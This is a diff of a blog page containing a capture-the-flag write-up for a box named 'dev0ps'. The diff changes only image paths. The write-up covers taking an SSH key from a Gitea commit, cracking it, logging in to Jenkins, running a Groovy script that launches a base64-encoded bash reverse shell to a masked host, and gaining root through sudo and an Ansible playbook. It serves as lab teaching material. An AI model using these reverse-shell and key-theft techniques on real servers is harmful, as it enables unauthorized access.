@@ -119,26 +119,26 @@ PORT     STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 88.06 seconds
 </code></pre><p>There are two websites, a Gitea with two repositories :</p>
-<p><img src="../img/dev0ps/img1.png" alt=""></p>
+<p><img src="../../img/dev0ps/img1.png" alt=""></p>
 <p>and a Jenkins website :</p>
-<p><img src="../img/dev0ps/img2.png" alt=""></p>
+<p><img src="../../img/dev0ps/img2.png" alt=""></p>
 <p>So we need to log in into Jenkins website.
 So let’s search into the 2 repositories if we can find something interesting.
 We see a .env file on the Infra repo :</p>
-<p><img src="../img/dev0ps/img3.png" alt=""></p>
+<p><img src="../../img/dev0ps/img3.png" alt=""></p>
 <p>We tried to log in with admin and the MySQL password, but failed :(
 Nothing more interesting on the Infra repo (except one thing that I’ve missed when I did the challenge) :</p>
-<p><img src="../img/dev0ps/img4.png" alt=""></p>
+<p><img src="../../img/dev0ps/img4.png" alt=""></p>
 <p>And we are going to see that “heroes” was the admin password. On the moment, I’ve seen this, and I tried admin with “git:heroes” because I didn’t check the doc of chpasswd. We are going to put this on the time that it was.(5 a.m) :) .</p>
 <p>So we checked Ecommerce repository, we see nothing clearly, so we checked the commits.</p>
-<p><img src="../img/dev0ps/img5.png" alt=""></p>
+<p><img src="../../img/dev0ps/img5.png" alt=""></p>
 <p>Nice, we see this Private ssh key in one of the commit of Ecommerce repo.
 After a few tries to log directly in ssh with, we try to crack it.</p>
-<p><img src="../img/dev0ps/img6.png" alt=""></p>
+<p><img src="../../img/dev0ps/img6.png" alt=""></p>
 <p>Nice, we got the password, so we tried to log in with it with admin user and yup, we are in.</p>
-<p><img src="../img/dev0ps/img7.png" alt=""></p>
+<p><img src="../../img/dev0ps/img7.png" alt=""></p>
 <p>Now we have to check for classic exploit with Jenkins.</p>
-<p><img src="../img/dev0ps/img8.png" alt=""></p>
+<p><img src="../../img/dev0ps/img8.png" alt=""></p>
 <p>We see that we could execute groovy script. We are going to execute a malicious script to get a shell. Here it is :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">def sout <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuffer<span style="color:#f92672">(),</span> serr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuffer<span style="color:#f92672">()</span>
 def proc <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>bash <span style="color:#f92672">-</span>c <span style="color:#f92672">{</span>echo<span style="color:#f92672">,</span>YmFzaCAtYyAnYmFzaCAtaSA<span style="color:#f92672">+</span>JiAvZGV2L3RjcC94eC54eC54eC54eHgveHh4eCAwPiYxJw<span style="color:#f92672">==}|{</span>base64<span style="color:#f92672">,-</span>d<span style="color:#f92672">}|{</span>bash<span style="color:#f92672">,-</span>i<span style="color:#f92672">}</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">()</span>
@@ -148,12 +148,12 @@ println <span style="color:#e6db74">&#34;out&gt; $sout err&gt; $serr&#34;</span>
 </code></pre></div><p>We put a little reverse shell one liner like this into base64 :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xxx/xxxx 0&gt;&amp;1&#39;</span>
 </code></pre></div><p>We’re just launched netcat, and we execute the script :</p>
-<p><img src="../img/dev0ps/img9.png" alt=""></p>
-<p><img src="../img/dev0ps/img10.png" alt=""></p>
+<p><img src="../../img/dev0ps/img9.png" alt=""></p>
+<p><img src="../../img/dev0ps/img10.png" alt=""></p>
 <p>Yup, we are in the box, and we get the first flag : <code>Hero{dc97a2f7da5304d12fe820bd2a6d343d}</code></p>
 <h2 id="pivot">Pivot</h2>
 <p>We move into our folder, and we see this script in our home folder:</p>
-<p><img src="../img/dev0ps/img11.png" alt=""></p>
+<p><img src="../../img/dev0ps/img11.png" alt=""></p>
 <p>So we find an OpenSSH private of the Gitea docker like we could see in the name of the script.
 Let’s convert it into an RSA private key and tried to log in with.
 We use this little script :</p>
@@ -176,10 +176,10 @@ ssh-keygen -i -f $puttygen_destinaton &gt; $rsa_destinaton
 $ file OPENSSH_rsa
 OPENSSH_rsa: PEM RSA private key
 </code></pre></div><p>Now we tried to log in the gitea container.</p>
-<p><img src="../img/dev0ps/img12.png" alt=""></p>
+<p><img src="../../img/dev0ps/img12.png" alt=""></p>
 <p>We see the docker file of Gitea container, and we see that the username is “git”.
 So we try to log in ssh with the private key on the port 2222 which was the ssh port.</p>
-<p><img src="../img/dev0ps/img12.png" alt=""></p>
+<p><img src="../../img/dev0ps/img12.png" alt=""></p>
 <p>Now, time to root part, a simple sudo -l going to tell us what we have to do :)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gitea:~$ sudo -l
 User git may run the following commands on gitea:
@@ -199,7 +199,7 @@ We are going to use this YAML script :</p>
 
 TASK <span style="color:#f92672">[</span>SHELL<span style="color:#f92672">]</span> ********************************************************************************************************
 ...
-</code></pre></div><p><img src="../img/dev0ps/img14.png" alt=""></p>
+</code></pre></div><p><img src="../../img/dev0ps/img14.png" alt=""></p>
 <p>We get the reverse shell connection back :)
 We put the second flag : <code>Hero{ce4e994cb477dec9b1ea876db647c562}</code>
 Thanks to xanhacks, this was a really cool box which include a totally new functionality exploitation for me with the root part.
